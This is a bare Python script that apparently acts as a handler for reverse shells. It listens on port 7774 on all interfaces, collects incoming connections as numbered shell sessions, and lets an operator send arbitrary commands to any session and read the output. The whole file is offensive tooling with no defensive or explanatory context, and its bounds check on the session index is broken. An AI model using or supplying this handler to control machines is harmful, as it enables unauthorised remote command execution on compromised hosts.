import socket
import threading

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 7774))

shells = []


def handle_connections():
    print(f'listening for connections...')
    while True:
        s.listen(1)
        conn, addr = s.accept()
        print(f'\n[connection received {addr}]')
        shells.append({'addr': addr[0], 'port': addr[1], 'conn': conn})

def show_shells():
    for i in range(len(shells)):
        print(f'[{i}] {shells[i]["addr"]}')

def send_command():
    shell = int(input('shell#> '))
    if  0 > shell > len(shells)-1:
        print('invalid shell index')
        return -1
    shell = shells[shell]
    cmd = input('cmd> ')
    cmd = cmd+'\n'
    shell['conn'].sendall(cmd.encode('utf-8'))
    resp = shell['conn'].recv(1024)
    print(resp.decode('utf-8'))


opts = {
    'shells': show_shells,
    'send': send_command,
    'exit': exit
}

t = threading.Thread(target=handle_connections, daemon=True).start()
while True:
    cmd = input('> ')
    if cmd in opts: opts[cmd]()
